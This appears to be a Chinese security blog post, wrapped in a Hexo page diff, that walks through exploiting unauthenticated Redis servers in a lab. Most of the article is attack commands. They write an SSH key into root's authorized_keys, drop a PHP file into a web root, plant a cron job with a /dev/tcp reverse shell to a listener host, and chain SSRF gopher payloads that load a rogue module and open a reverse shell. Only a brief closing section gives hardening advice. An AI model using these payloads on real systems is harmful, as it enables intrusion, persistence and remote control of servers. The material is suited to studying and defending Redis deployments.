@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Redis安全攻防Redis漏洞复现  一、redis基本命令连接redis：redis-cli -h 192.168.63.130 查看redis版本信息、一些具体信息、服务器版本信息等等：192.168.63.130:6379&gt;info 将变量x的值设为test：192.168.63.130:6379&gt;set x &quot;test&quot; 获取设置的某个变量的值：192.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis安全攻防">
+<meta property="og:url" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="Redis安全攻防Redis漏洞复现  一、redis基本命令连接redis：redis-cli -h 192.168.63.130 查看redis版本信息、一些具体信息、服务器版本信息等等：192.168.63.130:6379&gt;info 将变量x的值设为test：192.168.63.130:6379&gt;set x &quot;test&quot; 获取设置的某个变量的值：192.1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/tJ9dBcFvdTBku1jTUhQcDKqxROJLIVenpu7PvqOBpUA.png">
+<meta property="og:image" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/wN4rN0-J4Yb2LOTeWvuGhMNfQyq5OWe2ayIG4zI4ciQ.png">
+<meta property="og:image" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/CbHaC0VXV9q7Rd4Yxr6MV3bXaaxu5r5SKbErCn8vkys.png">
+<meta property="og:image" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/pm6PrjoMOT2GhDwE0iqM7hU-7t-sLSX3r5PgAvrmDJY.png">
+<meta property="og:image" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/iM6sagql4-kqrADpZInkmJ6zh4vtofNOYUwDPzfm7_U.png">
+<meta property="og:image" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/lDqgVfprnZ3D0FTI66AafHin2tcShom-sJbv4WuT_2E.png">
+<meta property="og:image" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/HUQdX281pGZPxp9vb_wwH6mhHEM8YRu5K4lpVwUFqP8.png">
+<meta property="og:image" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/qgpu3LTShkNyt4g9iNJ3HT6boMeI7ezlTRBxaSxuams.png">
+<meta property="article:published_time" content="2022-04-22T02:38:38.000Z">
+<meta property="article:modified_time" content="2023-05-23T13:41:48.094Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="Redis">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/tJ9dBcFvdTBku1jTUhQcDKqxROJLIVenpu7PvqOBpUA.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Redis安全攻防</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/06/Fasjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/07/Windows%E5%9F%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88CVE-2021-42287%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&text=Redis安全攻防"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&is_video=false&description=Redis安全攻防"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Redis安全攻防&body=Check out this article: https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&name=Redis安全攻防&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&t=Redis安全攻防"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2"><span class="toc-number">1.</span> <span class="toc-text">Redis安全攻防</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81redis%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">一、redis基本命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81redis%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%E6%8B%BFshell"><span class="toc-number">3.</span> <span class="toc-text">二、redis写入公钥拿shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81redis%E5%86%99webshell%EF%BC%88%E6%8B%BF%E4%B8%8Bwebshell%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">三、redis写webshell（拿下webshell）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%88nc%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">四、利用计划任务反弹shell（nc反弹shell）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81ssrf-redis-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.</span> <span class="toc-text">五、ssrf redis 反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81redis%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE"><span class="toc-number">7.</span> <span class="toc-text">六、redis安全设置</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Redis安全攻防
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-22T02:38:38.000Z" class="dt-published" itemprop="datePublished">2022-04-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Redis/" rel="tag">Redis</a>, <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Redis安全攻防"><a href="#Redis安全攻防" class="headerlink" title="Redis安全攻防"></a>Redis安全攻防</h1><p>Redis漏洞复现 </p>
+<h1 id="一、redis基本命令"><a href="#一、redis基本命令" class="headerlink" title="一、redis基本命令"></a>一、redis基本命令</h1><p>连接redis：<code>redis-cli -h 192.168.63.130</code></p>
+<p>查看redis版本信息、一些具体信息、服务器版本信息等等：<code>192.168.63.130:6379&gt;info</code></p>
+<p>将变量x的值设为test：<code>192.168.63.130:6379&gt;set x &quot;test&quot;</code></p>
+<p>获取设置的某个变量的值：<code>192.168.63.130:6379&gt;get x</code></p>
+<p>`flushall`是把整个redis数据库删除，一般情况下不要用！！！<code>192.168.63.130:6379&gt;flushall</code></p>
+<p>查看所有键：<code>192.168.63.130:6379&gt;KEYS *</code></p>
+<p>获取默认的redis目录、和rdb文件名：可以在修改前先获取，然后走的时候再恢复。</p>
+<p><code>192.168.63.130:6379&gt;CONFIG GET dir</code></p>
+<p><code>192.168.63.130:6379&gt;CONFIG GET dbfilename</code></p>
+<h1 id="二、redis写入公钥拿shell"><a href="#二、redis写入公钥拿shell" class="headerlink" title="二、redis写入公钥拿shell"></a>二、redis写入公钥拿shell</h1><p>1.生成密钥公钥</p>
+<p><code>ssh-keygen -t rsa</code></p>
+<p><img src="tJ9dBcFvdTBku1jTUhQcDKqxROJLIVenpu7PvqOBpUA.png" alt="image"></p>
+<p>2.防止乱码 导出key(在&#x2F;root&#x2F;.ssh下执行)</p>
+<p><code>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</code></p>
+<p><img src="wN4rN0-J4Yb2LOTeWvuGhMNfQyq5OWe2ayIG4zI4ciQ.png" alt="image"><br><code>查看密钥 ： cat key.txt </code></p>
+<p><img src="CbHaC0VXV9q7Rd4Yxr6MV3bXaaxu5r5SKbErCn8vkys.png" alt="image"><br><code>查看密钥并且设置：cat key.txt | redis-cli -h 192.168.0.108 --pass pass123 -x set xxx</code></p>
+<p><img src="pm6PrjoMOT2GhDwE0iqM7hU-7t-sLSX3r5PgAvrmDJY.png" alt="image"></p>
+<p><code>redis-cli -h 192.168.1.102</code></p>
+<p><code>192.168.1.102:6379&gt; config set dir /root/.ssh</code></p>
+<p><code>192.168.1.102:6379&gt; config set dbfilename authorized_keys</code></p>
+<p><code>192.168.1.102:6379&gt; save</code></p>
+<p><code>192.168.1.102:6379&gt; exit</code></p>
+<p><img src="iM6sagql4-kqrADpZInkmJ6zh4vtofNOYUwDPzfm7_U.png" alt="image"></p>
+<h1 id="三、redis写webshell（拿下webshell）"><a href="#三、redis写webshell（拿下webshell）" class="headerlink" title="三、redis写webshell（拿下webshell）"></a>三、redis写webshell（拿下webshell）</h1><p>知道网站根路径，或者能猜测</p>
+<p><code>/var/www/wordpress</code></p>
+<p><code>/var/www/html/randomapi</code></p>
+<p><code> </code></p>
+<p><code>config set dir /var/www/wordpress</code></p>
+<p><code>config set dbfilename shell.php</code></p>
+<p><code>set x &quot;&lt;?php phpinfo();?&gt;&quot;</code></p>
+<p><code>save</code></p>
+<p><img src="lDqgVfprnZ3D0FTI66AafHin2tcShom-sJbv4WuT_2E.png" alt="image"></p>
+<p>访问</p>
+<p><img src="HUQdX281pGZPxp9vb_wwH6mhHEM8YRu5K4lpVwUFqP8.png" alt="image"></p>
+<h1 id="四、利用计划任务反弹shell（nc反弹shell）"><a href="#四、利用计划任务反弹shell（nc反弹shell）" class="headerlink" title="四、利用计划任务反弹shell（nc反弹shell）"></a>四、利用计划任务反弹shell（nc反弹shell）</h1><p>1.写入语句到变量x</p>
+<p><code>echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.16.126/7799 0&gt;&amp;1\n\n&quot;|redis-cli -h 192.168.1.102 -x set 1</code></p>
+<p>2.#设置Redis的备份路径</p>
+<p><code>redis-cli -h 192.168.1.102 config set dir /var/spool/cron/  </code></p>
+<p>3.#设置备份文件和文件名</p>
+<p><code>redis-cli -h 192.168.1.102 config set dbfilename root</code></p>
+<p><code>redis-cli -h 192.168.1.102 save</code></p>
+<p><img src="qgpu3LTShkNyt4g9iNJ3HT6boMeI7ezlTRBxaSxuams.png" alt="image"></p>
+<p>Kali监听</p>
+<p><code>nc -lvnp 7799</code></p>
+<p> </p>
+<h1 id="五、ssrf-redis-反弹shell"><a href="#五、ssrf-redis-反弹shell" class="headerlink" title="五、ssrf redis 反弹shell"></a>五、ssrf redis 反弹shell</h1><p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit</code></p>
+<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.0.119%252021000%250d%250aquit</code></p>
+<p>导入模块 </p>
+<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250amodule%2520load%2520./exp.so%250d%250aquit</code></p>
+<p>关闭主从</p>
+<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aslaveof%2520NO%2520ONE%250d%250aquit</code></p>
+<p>设置数据库名</p>
+<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit</code></p>
+<p>反弹shell</p>
+<p><code>gopher://0.0.0.0:6379/_auth%2520welcometowangdingbeissrfme6379%250d%250asystem.rev%2520192.168.0.119%25206666%250d%250aquit</code></p>
+<h1 id="六、redis安全设置"><a href="#六、redis安全设置" class="headerlink" title="六、redis安全设置"></a>六、redis安全设置</h1><p>1、单独为redis设置一个普通账号 启动redis</p>
+<p>2、设置本地 localhost 不允许外部访问</p>
+<p>3、保护模式开启 protected-mode 开启 （默认开启）</p>
+<p>4、把端口最好更改</p>
+<p>5、requirepass 设置redis密码 </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2"><span class="toc-number">1.</span> <span class="toc-text">Redis安全攻防</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81redis%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">一、redis基本命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81redis%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%E6%8B%BFshell"><span class="toc-number">3.</span> <span class="toc-text">二、redis写入公钥拿shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81redis%E5%86%99webshell%EF%BC%88%E6%8B%BF%E4%B8%8Bwebshell%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">三、redis写webshell（拿下webshell）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%88%A9%E7%94%A8%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%88nc%E5%8F%8D%E5%BC%B9shell%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">四、利用计划任务反弹shell（nc反弹shell）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81ssrf-redis-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.</span> <span class="toc-text">五、ssrf redis 反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81redis%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE"><span class="toc-number">7.</span> <span class="toc-text">六、redis安全设置</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&text=Redis安全攻防"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&is_video=false&description=Redis安全攻防"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Redis安全攻防&body=Check out this article: https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&title=Redis安全攻防"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&name=Redis安全攻防&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/04/22/Redis%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/&t=Redis安全攻防"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
